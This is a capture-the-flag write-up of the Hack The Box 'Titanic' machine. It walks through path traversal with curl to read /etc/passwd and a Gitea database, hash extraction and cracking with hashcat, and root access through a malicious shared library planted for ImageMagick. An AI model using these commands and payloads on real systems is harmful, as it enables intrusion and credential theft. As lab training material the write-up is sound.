 Titanic (Linux)

First thing first, I ran `nmap -sVC` on the targets IP address.

## Nmap
22 SSH
80 TCP
Are both open. 

I opened up the IP address on a web browser but nothing loads. Porbaly need to add into our /etc file
Once we Added into our `/etc/hosts`; I gave it some time and right afterwards I had access to the website on my local machine. 

## titanic.htb
**Book Your Trip** button downloads a json file unto your machine, when filled out appropriately.
The buttons on the header dont work other than **Book Now** which does the same as **Book Your Trip**

## Fuzzing
200 on subdomain **dev**
Added to my `/etc/hosts` and visited the webpage.
Running on Gitea Version: 1.22.1; checked for any vuln but as of now based of what I saw on Github, the most recent one has been patched. 

I went into the **Explore** button and found the repository for this application. 
One of the repo had **docker-config** that also had **mysql** folder that had a **docker-compose.yml** file:

```
version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always

```

gitea folder also had a **docker-compose.yml**

```
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```

Notice and rememeber the paths we have come across.

While looking at the other repository I came across **app.py** and checked for any vuln.

```
@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400

    json_filepath = os.path.join(TICKETS_DIR, ticket)

```
1. Ticket comes directly from user input (request.args.get('ticket')).
2. There is no validation to ensure the filename is within TICKETS_DIR.

## Curl
`curl http://titanic.htb/download?ticket=../../../../etc/passwd`
This contained a list of users on the system

`developer:x:1000:1000:developer:/home/developer:/bin/bash`
This is likely a human user with a real home directory.

Why not try and do the same with curl again.. Since we know the file we are looking for (**user.txt**), we can insert that into our `curl` command.
`curl http://titanic.htb/download?ticket=../../../../home/developer/user.txt`

**User Flag Pwned**

## Stil on curl
Since I have been using curl thus far I thought to continue on using it. 
`curl -o gitea.db "http://titanic.htb/downloadticket=../../../../home/developer/gitea/data/gitea/gitea.db"`
Using the `-o` flag tells `curl` to save the downloaded content to a file (**gitea.db**). 
And I am still using [path traversal](https://github.com/mksiki/notes/blob/main/path_traversal.md). 

## SQLite3 
[Analyzed and used to extract password hashes](https://github.com/mksiki/notes/blob/main/sqlite3_ex.md). 
```

sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes

```

## Hashcat 
`hashcat -m 10900 gitea.hashes /usr/share/wordlists/rockyou.txt --username`
After finding the password I used ssh to get into the machine. See theuser flag that I already got but also files that we also already saw before.

## SSH (privilege escalation)
Located `/opt/` [directory](https://github.com/mksiki/notes/blob/main/opt.md) which we used to explore. 
`/scripts/` then used `cat` to explore the contents of the file that was inside.

Checked for `magick -version` that was used to exploit; simple Google search. 
Looked at the poc and used this,

```
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /root/root.txt root.txt; chmod 754 root.txt");
    exit(0);
}
EOF

```
Ran this code in the `/opt/app/static/assets/images/`
This directory is writable and accessible, making it a suitable location to upload or execute arbitrary code. [Example](https://github.com/mksiki/notes/blob/main/opt.md)

3-5 seconds I `ls` and saw `root.txt`.
PWNED!
